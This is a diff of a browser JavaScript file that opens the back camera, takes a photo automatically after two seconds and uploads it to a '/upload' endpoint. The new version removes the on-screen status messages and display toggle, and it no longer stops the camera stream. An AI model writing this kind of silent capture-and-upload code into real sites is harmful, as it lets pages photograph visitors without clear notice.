@@ -1,57 +1,32 @@
-document.addEventListener('DOMContentLoaded', async () => {
-    const captureContainer = document.getElementById('capture-container');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('capture-canvas');
-    const context = canvas.getContext('2d');
-    const status = document.getElementById('status');
+// Access the video element and canvas
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const context = canvas.getContext('2d');
 
-    try {
-        // Access the back camera
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'environment' }
-        });
-        video.srcObject = stream;
+// Request access to the camera
+navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+  .then(stream => {
+    video.srcObject = stream;
+  })
+  .catch(err => {
+    console.error('Error accessing camera: ', err);
+  });
 
-        video.addEventListener('loadedmetadata', async () => {
-            // Set canvas size based on video size
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+// Capture image after 2 seconds
+setTimeout(() => {
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  const imageData = canvas.toDataURL('image/png');
 
-            // Display the video and capture photo after 2 seconds
-            captureContainer.style.display = 'flex';
-            setTimeout(async () => {
-                // Capture the image
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const dataURL = canvas.toDataURL('image/png');
+  // Automatically upload the image to the server
+  fetch('/upload', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ image: imageData })
+  })
+  .then(response => response.text())
+  .then(data => console.log(data))
+  .catch(err => console.error('Error uploading image: ', err));
 
-                // Send image data to server
-                try {
-                    const response = await fetch('/upload', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ image: dataURL })
-                    });
-
-                    if (response.ok) {
-                        status.textContent = 'Photo uploaded successfully!';
-                    } else {
-                        status.textContent = 'Failed to upload photo.';
-                    }
-                } catch (error) {
-                    console.error('Error occurred during upload:', error);
-                    status.textContent = 'Failed to upload photo.';
-                }
-
-                // Hide capture container and stop the video stream
-                captureContainer.style.display = 'none';
-                stream.getTracks().forEach(track => track.stop());
-            }, 2000); // Show the image for 2 seconds
-        });
-
-    } catch (error) {
-        console.error('Camera access denied or not available.', error);
-        status.textContent = 'Failed to access camera.';
-    }
-});
+}, 2000); // Capture after 2 seconds
